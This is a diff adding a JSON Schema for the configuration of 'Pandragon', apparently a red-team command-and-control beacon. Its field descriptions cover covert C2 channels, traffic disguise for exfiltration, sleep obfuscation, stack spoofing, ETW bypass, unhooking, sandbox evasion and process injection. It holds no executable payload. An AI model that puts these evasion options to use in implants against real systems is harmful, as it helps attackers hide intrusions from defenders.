@@ -1,0 +1,416 @@
+{
+    "$schema": "http://json-schema.org/draft-07/schema#",
+    "$id": "pandragon-beacon-config.json",
+    "title": "Pandragon Beacon Configuration",
+    "description": "Configuration schema for Pandragon C2 beacon",
+    "type": "object",
+    "required": ["c2_channels"],
+    "properties": {
+        "beacon_id": {
+            "type": "string",
+            "description": "8-byte beacon ID as hex string",
+            "pattern": "^[0-9a-fA-F]{16}$"
+        },
+        "crypto_key": {
+            "type": "string",
+            "description": "32-byte encryption key as hex string",
+            "pattern": "^[0-9a-fA-F]{64}$"
+        },
+        "c2_channels": {
+            "type": "array",
+            "description": "List of C2 communication channels",
+            "minItems": 1,
+            "maxItems": 4,
+            "items": {
+                "type": "object",
+                "required": ["type", "host", "port", "path", "user_agent", "max_consecutive_failures", "backoff_sleep_ms"],
+                "properties": {
+                    "type": {
+                        "type": "string",
+                        "enum": ["HTTP", "HTTPS", "TCP", "PIPE"],
+                        "description": "Channel type (PIPE = named pipe for SMB relay)"
+                    },
+                    "host": {
+                        "type": "string",
+                        "description": "C2 server hostname",
+                        "minLength": 1,
+                        "maxLength": 255
+                    },
+                    "port": {
+                        "type": "integer",
+                        "description": "Server port",
+                        "minimum": 1,
+                        "maximum": 65535
+                    },
+                    "path": {
+                        "type": "string",
+                        "description": "HTTP request path",
+                        "minLength": 1,
+                        "maxLength": 256
+                    },
+                    "user_agent": {
+                        "type": "string",
+                        "description": "User-Agent header",
+                        "minLength": 1,
+                        "maxLength": 256
+                    },
+                    "max_consecutive_failures": {
+                        "type": "integer",
+                        "description": "Max consecutive failures before backoff",
+                        "minimum": 1,
+                        "maximum": 100
+                    },
+                    "backoff_sleep_ms": {
+                        "type": "integer",
+                        "description": "Backoff sleep duration in milliseconds",
+                        "minimum": 1000,
+                        "maximum": 300000
+                    },
+                    "http_method": {
+                        "type": "string",
+                        "enum": ["GET", "POST"],
+                        "description": "HTTP method for data transmission. GET uses query strings, POST uses request body (better for large payloads)"
+                    },
+                    "malleable_config": {
+                        "type": "object",
+                        "description": "Per-channel malleable config (overrides global). If absent, uses global malleable config. TCP channels should omit this.",
+                        "properties": {
+                            "wrapper": {
+                                "type": "object",
+                                "description": "Prefix/suffix wrapper for base64url-encoded payloads (NOT encrypted)",
+                                "properties": {
+                                    "prefix": {
+                                        "type": "string",
+                                        "description": "String to prepend to payload",
+                                        "maxLength": 256
+                                    },
+                                    "suffix": {
+                                        "type": "string",
+                                        "description": "String to append to payload",
+                                        "maxLength": 256
+                                    }
+                                },
+                                "additionalProperties": false
+                            },
+                            "http_headers": {
+                                "type": "array",
+                                "description": "Custom HTTP headers to add to every request",
+                                "maxItems": 255,
+                                "items": {
+                                    "type": "object",
+                                    "required": ["name", "value"],
+                                    "properties": {
+                                        "name": {
+                                            "type": "string",
+                                            "description": "HTTP header name",
+                                            "minLength": 1,
+                                            "maxLength": 256
+                                        },
+                                        "value": {
+                                            "type": "string",
+                                            "description": "HTTP header value",
+                                            "maxLength": 1024
+                                        }
+                                    }
+                                }
+                            },
+                            "payload_location": {
+                                "type": "object",
+                                "required": ["type"],
+                                "description": "Where to place the (wrapped) payload in the HTTP request",
+                                "properties": {
+                                    "type": {
+                                        "type": "string",
+                                        "enum": ["query_param", "path", "body"],
+                                        "description": "Location type: query_param (?q=PAYLOAD), path (/PREFIXPAYLOADSUFFIX), or body (POST data)"
+                                    },
+                                    "param_name": {
+                                        "type": "string",
+                                        "description": "Query parameter name (for query_param type)",
+                                        "maxLength": 256
+                                    },
+                                    "path_prefix": {
+                                        "type": "string",
+                                        "description": "Prefix to add before payload in path mode",
+                                        "maxLength": 256
+                                    },
+                                    "path_suffix": {
+                                        "type": "string",
+                                        "description": "Suffix to add after payload in path mode (e.g., .png)",
+                                        "maxLength": 256
+                                    },
+                                    "body_content_type": {
+                                        "type": "string",
+                                        "description": "Content-Type for body mode",
+                                        "enum": ["text/plain", "application/octet-stream"]
+                                    }
+                                },
+                                "additionalProperties": false
+                            }
+                        },
+                        "additionalProperties": false
+                    }
+                },
+                "additionalProperties": false
+            }
+        },
+        "sleep_ms": {
+            "type": "integer",
+            "description": "Base sleep interval in milliseconds",
+            "minimum": 100,
+            "maximum": 3600000
+        },
+        "jitter_pct": {
+            "type": "integer",
+            "description": "Jitter percentage (0-100)",
+            "minimum": 0,
+            "maximum": 100
+        },
+        "use_indirect_syscalls": {
+            "type": "boolean",
+            "description": "If true, enable indirect syscalls via HWBPs at runtime"
+        },
+        "indirect_syscall_pivot": {
+            "type": "string",
+            "description": "Custom pivot API for indirect syscalls (must start with 'Zw', no 'Nt' allowed). If not set, uses default.",
+            "pattern": "^Zw[A-Za-z0-9]+$"
+        },
+        "lazy_checkin": {
+            "type": "boolean",
+            "description": "If true, defer system info check-in to a random poll within lazy_checkin_max"
+        },
+        "lazy_checkin_max": {
+            "type": "integer",
+            "description": "Maximum number of polls before check-in is guaranteed (1-255)",
+            "minimum": 1,
+            "maximum": 255
+        },
+        "lazy_unhook": {
+            "type": "boolean",
+            "description": "If true, unhook requied DLLs only before BOF execution (transparent). If false, never unhook."
+        },
+        "sleep_obfuscation": {
+            "type": "string",
+            "enum": ["none", "ekko", "foliage"],
+            "default": "none",
+            "description": "Sleep obfuscation method. 'ekko' = CreateTimerQueueTimer based, 'foliage' = future"
+        },
+        "sleep_wipe_pe_headers": {
+            "type": "boolean",
+            "default": false,
+            "description": "If true, zero out PE headers during sleep to avoid memory scanner detection"
+        },
+        "sleep_stack_spoof": {
+            "type": "boolean",
+            "default": false,
+            "description": "If true, swap NT_TIB (StackLimit/StackBase) during sleep obfuscation ROP chain"
+        },
+        "num_spoof_frames": {
+            "type": "integer",
+            "default": 6,
+            "minimum": 0,
+            "maximum": 65535,
+            "description": "Number of fake return-address frames to write on the spoofed sleep stack (0 = use default of 6)"
+        },
+        "stack_spoof_chain": {
+            "type": "array",
+            "description": "Ordered list of module!function pairs whose last ret instruction is used as fake return addresses on the spoofed sleep stack. Cycled through for num_spoof_frames writes. If empty, Python builder prepends ntdll!RtlUserThreadStart + kernel32!BaseThreadInitThunk.",
+            "maxItems": 256,
+            "items": {
+                "type": "object",
+                "required": ["module", "function"],
+                "properties": {
+                    "module": {
+                        "type": "string",
+                        "description": "DLL module name (e.g. user32.dll)",
+                        "minLength": 1,
+                        "maxLength": 255
+                    },
+                    "function": {
+                        "type": "string",
+                        "description": "Export function name (e.g. ZwUserGetMessage)",
+                        "minLength": 1,
+                        "maxLength": 255
+                    },
+                    "offset": {
+                        "type": "integer",
+                        "default": 0,
+                        "minimum": 0,
+                        "maximum": 4294967295,
+                        "description": "Explicit byte offset from function start (0 = auto-scan for last ret). When set, uses funcRVA + offset directly instead of scanning."
+                    }
+                },
+                "additionalProperties": false
+            }
+        },
+        "kill_date": {
+            "type": "string",
+            "description": "Kill date in ISO format (YYYY-MM-DD)",
+            "pattern": "^\\d{4}-\\d{2}-\\d{2}$"
+        },
+        "options": {
+            "type": "object",
+            "properties": {
+                "sandbox_evasion": {
+                    "type": "boolean"
+                },
+                "debug_mode": {
+                    "type": "boolean"
+                },
+                "bypass_etw": {
+                    "type": "boolean",
+                    "description": "If true, enable ETW bypass via HWBP before sending checkin"
+                },
+                "validate_ssl": {
+                    "type": "boolean",
+                    "description": "If true, validate SSL certificates (for production). If false, ignore cert errors (for testing)"
+                }
+            },
+            "additionalProperties": false
+        },
+        "pad": {
+            "type": "boolean",
+            "default": false,
+            "description": "Enable PKCS#7 padding for fixed-size C2 traffic"
+        },
+        "pad_max": {
+            "type": "integer",
+            "default": 1024,
+            "minimum": 0,
+            "maximum": 65535,
+            "description": "Maximum PKCS#7 padding length in bytes"
+        },
+        "malleable_config": {
+            "type": "object",
+            "description": "Malleable network configuration for exfil obfuscation",
+            "properties": {
+                "wrapper": {
+                    "type": "object",
+                    "description": "Prefix/suffix wrapper for base64url-encoded payloads (NOT encrypted)",
+                    "properties": {
+                        "prefix": {
+                            "type": "string",
+                            "description": "String to prepend to payload",
+                            "maxLength": 256
+                        },
+                        "suffix": {
+                            "type": "string",
+                            "description": "String to append to payload",
+                            "maxLength": 256
+                        }
+                    },
+                    "additionalProperties": false
+                },
+                "http_headers": {
+                    "type": "array",
+                    "description": "Custom HTTP headers to add to every request",
+                    "maxItems": 255,
+                    "items": {
+                        "type": "object",
+                        "required": ["name", "value"],
+                        "properties": {
+                            "name": {
+                                "type": "string",
+                                "description": "HTTP header name",
+                                "minLength": 1,
+                                "maxLength": 64
+                            },
+                            "value": {
+                                "type": "string",
+                                "description": "HTTP header value",
+                                "maxLength": 1024
+                            }
+                        }
+                    }
+                },
+                "payload_location": {
+                    "type": "object",
+                    "required": ["type"],
+                    "description": "Where to place the (wrapped) payload in the HTTP request",
+                    "properties": {
+                        "type": {
+                            "type": "string",
+                            "enum": ["query_param", "path", "body"],
+                            "description": "Location type: query_param (?q=PAYLOAD), path (/PREFIXPAYLOADSUFFIX), or body (POST data)"
+                        },
+                        "param_name": {
+                            "type": "string",
+                            "description": "Query parameter name (for query_param type)",
+                            "maxLength": 64
+                        },
+                        "path_prefix": {
+                            "type": "string",
+                            "description": "Prefix to add before payload in path mode",
+                            "maxLength": 256
+                        },
+                        "path_suffix": {
+                            "type": "string",
+                            "description": "Suffix to add after payload in path mode (e.g., .png)",
+                            "maxLength": 64
+                        },
+                        "body_content_type": {
+                            "type": "string",
+                            "description": "Content-Type for body mode",
+                            "enum": ["text/plain", "application/octet-stream"]
+                        }
+                    },
+                    "additionalProperties": false
+                }
+            }
+        },
+        "work_hours": {
+            "type": "object",
+            "description": "UTC-based work hours configuration for beacon connectivity",
+            "properties": {
+                "enabled": {
+                    "type": "boolean",
+                    "description": "Enable work hours enforcement"
+                },
+                "start_hour": {
+                    "type": "integer",
+                    "description": "Start hour in UTC (0-23)",
+                    "minimum": 0,
+                    "maximum": 23
+                },
+                "start_minute": {
+                    "type": "integer",
+                    "description": "Start minute (0-59)",
+                    "minimum": 0,
+                    "maximum": 59
+                },
+                "end_hour": {
+                    "type": "integer",
+                    "description": "End hour in UTC (0-23)",
+                    "minimum": 0,
+                    "maximum": 23
+                },
+                "end_minute": {
+                    "type": "integer",
+                    "description": "End minute (0-59)",
+                    "minimum": 0,
+                    "maximum": 59
+                },
+                "insomnia": {
+                    "type": "boolean",
+                    "description": "If true: wake up normally but skip check-in. If false: sleep until work hours start"
+                }
+            },
+            "required": ["enabled", "start_hour", "start_minute", "end_hour", "end_minute", "insomnia"],
+            "additionalProperties": false
+        },
+        "spawnto": {
+            "type": "object",
+            "description": "Spawn-to process for process injection (supports %%ENV_VAR%% runtime expansion)",
+            "properties": {
+                "x64": {
+                    "type": "string",
+                    "description": "x64 spawnto path"
+                },
+                "x86": {
+                    "type": "string",
+                    "description": "x86 spawnto path"
+                }
+            }
+        }
+    }
+}
